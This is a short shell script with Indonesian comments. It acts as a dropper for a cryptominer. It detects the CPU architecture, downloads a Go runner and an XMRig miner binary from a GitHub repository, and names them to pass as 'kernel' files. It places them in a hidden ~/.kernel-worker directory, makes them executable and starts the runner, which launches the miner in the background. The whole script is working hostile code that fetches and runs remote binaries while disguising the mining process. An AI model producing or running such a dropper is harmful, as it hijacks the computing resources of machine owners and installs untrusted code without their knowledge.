#!/bin/sh
# Kernel (XMRig fallback runner) - Sync with kernel.go logic
# Dijalankan sebagai user biasa.

set -e

REPO_USER="anonking-67"
REPO_NAME="anon76"
BRANCH="main"
RAW_URL="https://github.com/${REPO_USER}/${REPO_NAME}/raw/refs/heads/${BRANCH}"

# Cek dependensi
command -v curl >/dev/null 2>&1 || { echo "[-] curl tidak ditemukan"; exit 1; }

# Deteksi arsitektur dan tentukan pasangan file yang harus didownload
ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64) 
        RUNNER_BIN="kernel"      # Hasil compile kernel.go untuk x86
        MINER_BIN="kernelU"      # XMRig binary untuk x86
        ;;
    aarch64|arm64) 
        RUNNER_BIN="kernel-arm64" # Hasil compile kernel.go untuk ARM
        MINER_BIN="kernelX"       # XMRig binary untuk ARM (aarch64)
        ;;
    *) 
        echo "[-] Arsitektur tidak didukung: $ARCH"; exit 1 ;;
esac

WORKDIR="$HOME/.kernel-worker"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

# 1. Download Runner Binary (Program Go)
echo "[+] Setup Runner untuk $ARCH..."
curl -fsSL -o "runner_active" "${RAW_URL}/${RUNNER_BIN}" || { echo "[-] Gagal download runner"; exit 1; }

# 2. Download Miner Binary (XMRig)
# Penting: Nama file harus sesuai dengan yang dicari oleh kernel.go (kernelU atau kernelX)
echo "[+] Setup Miner binary ($MINER_BIN) untuk $ARCH..."
curl -fsSL -o "$MINER_BIN" "${RAW_URL}/${MINER_BIN}" || { echo "[-] Gagal download miner binary"; exit 1; }

# Berikan izin eksekusi
chmod +x "runner_active" "$MINER_BIN"

echo "[+] Menjalankan Kernel Runner..."
# Kita jalankan runner_active, dia akan otomatis memanggil $MINER_BIN di background
./"runner_active"

echo "[+] Selesai. Periksa proses dengan 'ps aux | grep kernel'"